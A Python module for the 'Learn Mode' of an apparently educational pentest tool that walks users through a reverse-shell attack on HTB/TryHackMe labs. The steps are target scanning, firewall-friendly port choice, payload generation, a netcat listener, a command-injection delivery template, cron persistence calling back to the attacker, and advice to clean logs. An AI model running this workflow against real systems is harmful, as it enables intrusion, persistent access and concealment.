"""
Learn Mode - Educational mode with explanations at every step
"""

from typing import Optional, Dict
from learnshells.utils.logger import Logger
from learnshells.core.detector import TargetDetector, VulnerabilityDetector
from learnshells.core.interface_detector import InterfaceDetector
from learnshells.core.port_tester import PortTester
from learnshells.core.payload_selector import PayloadSelector
from learnshells.generators import get_generator
from learnshells.listeners import get_listener
from learnshells.stabilizers.tty_upgrade import TTYUpgrader
from learnshells.stabilizers.persistence import PersistenceManager


class LearnMode:
    """
    Learn Mode - Step-by-step with explanations.
    
    Perfect for beginners learning penetration testing.
    Explains every concept and asks for permission before actions.
    """
    
    def __init__(self, logger: Logger = None):
        """
        Initialize Learn Mode.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger(educational=True)
        self.target_url = None
        self.target_info = {}
        self.vpn_ip = None
        self.selected_port = None
        self.payload = None
        
        # Initialize components
        self.target_detector = TargetDetector(self.logger)
        self.vuln_detector = VulnerabilityDetector(self.logger)
        self.interface_detector = InterfaceDetector(self.logger)
        self.port_tester = PortTester(self.logger)
        self.payload_selector = PayloadSelector(self.logger)
        self.tty_upgrader = TTYUpgrader(self.logger)
        self.persistence_manager = PersistenceManager(self.logger)
    
    def run(self, target_url: Optional[str] = None):
        """
        Run Learn Mode workflow.
        
        Args:
            target_url: Optional target URL
        """
        self.logger.banner("""
    __                           __  __          __     
   / /   ___  ____ __________ _/  |/  /___  ___/ /__   
  / /   / _ \\/ __ `/ ___/ __ \\/ /|_/ / __ \\/ __  / _ \\  
 / /___/  __/ /_/ / /  / / / / /  / / /_/ / /_/ /  __/  
/_____/\\___/\\__,_/_/  /_/ /_/_/  /_/\\____/\\__,_/\\___/   
                                                         
        🎓 Learn by Doing • Step by Step
        """)
        
        self.logger.header("Welcome to Learn Mode!")
        self.logger.info(
            "This mode will guide you through getting a reverse shell step by step.\n"
            "You'll learn what each step does and why it's necessary.\n"
        )
        
        # Step 1: Introduction
        self._introduction()
        
        # Step 2: Check VPN
        if not self._check_vpn():
            return
        
        # Step 3: Get target
        if not target_url:
            target_url = self._get_target_input()
        
        if not target_url:
            return
        
        self.target_url = target_url
        
        # Step 4: Scan target
        self._scan_target()
        
        # Step 5: Find vulnerabilities
        if not self._find_vulnerabilities():
            return
        
        # Step 6: Select port
        self._select_port()
        
        # Step 7: Generate payload
        self._generate_payload()
        
        # Step 8: Start listener
        self._start_listener()
        
        # Step 9: Deliver payload
        self._deliver_payload()
        
        # Step 10: Post-exploitation
        self._post_exploitation()
    
    def _introduction(self):
        """Display introduction and basics."""
        self.logger.educational_note(
            "What is a Reverse Shell?",
            "A reverse shell is when the target machine connects BACK to you,\n"
            "giving you remote command execution.\n\n"
            "Normal:  You → Target (often blocked by firewall)\n"
            "Reverse: Target → You (usually allowed)\n\n"
            "We'll walk through each step of getting one!"
        )
        
        response = self.logger.confirm("Ready to start?", default=True)
        if not response:
            self.logger.info("Come back when you're ready!")
            return False
        
        return True
    
    def _check_vpn(self) -> bool:
        """Check and explain VPN connection."""
        self.logger.step(1, 10, "Checking VPN Connection")
        
        self.logger.educational_note(
            "Why Do We Need a VPN?",
            "HTB/TryHackMe machines are on private networks.\n"
            "The VPN connects you to their network so you can reach the targets.\n"
            "Your VPN IP is what the target will connect back to."
        )
        
        vpn_interface = self.interface_detector.detect_vpn_interface()
        
        if not vpn_interface:
            self.logger.error(
                "No VPN detected. Please connect to HTB/THM VPN first.",
                explain="Download the .ovpn file from HTB/THM and run:\n"
                       "sudo openvpn your_vpn.ovpn"
            )
            return False
        
        self.vpn_ip = self.interface_detector.vpn_ip
        self.logger.success(f"VPN connected! Your IP: {self.vpn_ip}")
        
        # Test VPN
        if self.logger.confirm("Would you like to test VPN connectivity?"):
            self.interface_detector.test_vpn_connectivity()
        
        return True
    
    def _get_target_input(self) -> Optional[str]:
        """Get target URL from user with explanation."""
        self.logger.step(2, 10, "Getting Target Information")
        
        self.logger.educational_note(
            "What Do We Need?",
            "We need to know:\n"
            "1. Target URL or IP\n"
            "2. Any vulnerable endpoints (like search, upload, etc.)\n\n"
            "For HTB/THM, this is usually provided in the machine description."
        )
        
        target = self.logger.prompt("Enter target URL or IP")
        
        if not target:
            self.logger.warning("No target provided")
            return None
        
        return target
    
    def _scan_target(self):
        """Scan and explain target information."""
        self.logger.step(3, 10, "Scanning Target")
        
        self.logger.educational_note(
            "Reconnaissance",
            "Before attacking, we need to know:\n"
            "• What OS is running? (Linux vs Windows)\n"
            "• What web server? (Apache, Nginx, IIS)\n"
            "• What technologies? (PHP, Python, Node.js)\n\n"
            "This helps us choose the right payload."
        )
        
        self.target_info = self.target_detector.probe_target(self.target_url)
        
        if self.logger.confirm("Would you like to learn more about the target?"):
            self.logger.info("\nTarget Details:")
            self.logger.list_item(f"OS: {self.target_info['os']}")
            self.logger.list_item(f"Web Server: {self.target_info['web_server']}")
            if self.target_info['technologies']:
                self.logger.list_item(f"Technologies: {', '.join(self.target_info['technologies'])}")
    
    def _find_vulnerabilities(self) -> bool:
        """Find and explain vulnerabilities."""
        self.logger.step(4, 10, "Finding Vulnerabilities")
        
        self.logger.educational_note(
            "Vulnerability Scanning",
            "We're looking for ways to execute commands on the target.\n"
            "Common vulnerabilities:\n"
            "• Command Injection (OS commands in parameters)\n"
            "• File Upload (upload malicious files)\n"
            "• SQL Injection (sometimes leads to RCE)\n"
            "• Deserialization (code execution flaws)\n\n"
            "Let's scan for these..."
        )
        
        vulns = self.vuln_detector.detect_vulnerabilities(self.target_url)
        
        if not vulns:
            self.logger.warning(
                "No obvious vulnerabilities found automatically.",
                explain="This doesn't mean the target isn't vulnerable!\n"
                       "You might need to:\n"
                       "• Manually test parameters\n"
                       "• Try different endpoints\n"
                       "• Use specialized tools\n"
                       "• Find hidden directories"
            )
            
            if not self.logger.confirm("Continue anyway?"):
                return False
        else:
            self.logger.success(f"Found {len(vulns)} vulnerabilities!")
            
            if self.logger.confirm("Would you like details?"):
                for vuln in vulns:
                    self.logger.info(f"\nVulnerability: {vuln['type']}")
                    self.logger.list_item(f"Parameter: {vuln.get('parameter', 'N/A')}")
                    self.logger.list_item(f"Payload: {vuln.get('payload', 'N/A')}")
        
        return True
    
    def _select_port(self):
        """Select port with explanation."""
        self.logger.step(5, 10, "Selecting Listener Port")
        
        self.logger.educational_note(
            "Choosing a Port",
            "We need to pick a port for our listener.\n\n"
            "Best ports:\n"
            "• 443 (HTTPS) - Almost never blocked\n"
            "• 80 (HTTP) - Very common, usually allowed\n"
            "• 53 (DNS) - Sometimes works\n\n"
            "Avoid:\n"
            "• 4444 (Metasploit default - often blocked)\n"
            "• Random high ports - suspicious"
        )
        
        # Test common ports
        if self.logger.confirm("Test which ports are available?"):
            self.port_tester.test_common_ports()
        
        self.selected_port = self.port_tester.find_best_port()
        
        self.logger.success(f"Selected port: {self.selected_port}")
    
    def _generate_payload(self):
        """Generate payload with explanation."""
        self.logger.step(6, 10, "Generating Payload")
        
        self.logger.educational_note(
            "What is a Payload?",
            "A payload is the code that runs on the target to create\n"
            "the reverse shell connection.\n\n"
            "The payload:\n"
            "1. Creates a network socket\n"
            "2. Connects to your IP and port\n"
            "3. Redirects input/output through the connection\n"
            "4. Spawns a shell\n\n"
            "Different languages have different payloads."
        )
        
        # Select payload type
        payload_type = self.payload_selector.select_payload_type(self.target_info)
        
        self.logger.info(f"Recommended payload: {payload_type}")
        
        if self.logger.confirm("Use this payload type?", default=True):
            # Generate payload
            generator = get_generator(payload_type, self.logger)
            self.payload = generator.generate(self.vpn_ip, self.selected_port)
            
            self.logger.payload_display(self.payload, payload_type)
            
            if self.logger.confirm("Would you like an explanation of this payload?"):
                explanation = generator.explain(self.payload)
                self.logger.print(explanation)
    
    def _start_listener(self):
        """Start listener with explanation."""
        self.logger.step(7, 10, "Starting Listener")
        
        self.logger.educational_note(
            "The Listener",
            "The listener waits for the target to connect back.\n\n"
            "Think of it like answering the phone:\n"
            "• Listener = Your phone ringing\n"
            "• Target executes payload = Someone calling you\n"
            "• Connection = You answer the phone\n\n"
            "We'll use netcat (nc) to listen."
        )
        
        self.logger.info(f"Starting listener on {self.vpn_ip}:{self.selected_port}")
        self.logger.info("In a new terminal, run:")
        self.logger.command(f"nc -lvnp {self.selected_port}")
        
        self.logger.warning("\nDO NOT close that terminal!")
        
        self.logger.confirm("Press Enter when listener is ready...")
    
    def _deliver_payload(self):
        """Explain payload delivery."""
        self.logger.step(8, 10, "Delivering Payload")
        
        self.logger.educational_note(
            "Payload Delivery",
            "Now we need to get the target to execute our payload.\n\n"
            "Methods depend on the vulnerability:\n"
            "• Command Injection: Inject payload in parameter\n"
            "• File Upload: Upload script and access it\n"
            "• SQL Injection: Use xp_cmdshell or INTO OUTFILE\n\n"
            "For command injection (most common):\n"
            "Add payload to vulnerable parameter and submit."
        )
        
        self.logger.info("Your payload:")
        self.logger.code_block(self.payload)
        
        self.logger.info("\nDeliver this payload through the vulnerability.")
        self.logger.tip(
            "For command injection:\n"
            "  http://target.com/search?q=; YOUR_PAYLOAD_HERE"
        )
        
        self.logger.confirm("Press Enter after executing payload...")
    
    def _post_exploitation(self):
        """Post-exploitation guidance."""
        self.logger.step(9, 10, "Post-Exploitation")
        
        self.logger.shell_connected(self.target_url)
        
        self.logger.educational_note(
            "You Got a Shell! Now What?",
            "Congratulations! You have a reverse shell.\n\n"
            "Next steps:\n"
            "1. Stabilize the shell (upgrade to full TTY)\n"
            "2. Enumerate the system\n"
            "3. Look for privilege escalation\n"
            "4. Install persistence (maintain access)\n"
            "5. Cover your tracks (clean logs)\n\n"
            "Let's stabilize first..."
        )
        
        # TTY Upgrade
        if self.logger.confirm("Upgrade to full TTY?"):
            self.tty_upgrader.display_upgrade_guide()
        
        # Persistence
        if self.logger.confirm("\nInstall persistence mechanisms?"):
            self.logger.info("Recommended persistence methods:")
            self.persistence_manager.display_persistence_menu(
                self.target_info.get('os', 'linux')
            )
            
            if self.logger.confirm("Generate cron job persistence?"):
                cron_info = self.persistence_manager.generate_cron_job(
                    self.vpn_ip,
                    self.selected_port
                )
                self.logger.info("\nInstall command:")
                self.logger.command(cron_info['commands']['install_user'])
        
        # Final tips
        self.logger.step(10, 10, "Completion")
        
        self.logger.results(
            True,
            "You've completed the Learn Mode workflow!\n\n"
            "You now know how to:\n"
            "• Check VPN connectivity\n"
            "• Scan targets for information\n"
            "• Find vulnerabilities\n"
            "• Generate appropriate payloads\n"
            "• Start listeners\n"
            "• Deliver payloads\n"
            "• Upgrade shells\n"
            "• Install persistence\n\n"
            "Practice these steps on more machines to master them!"
        )
        
        self.logger.tip(
            "Next time, try Auto Mode for faster exploitation:\n"
            "  learnshells auto http://target.com"
        )
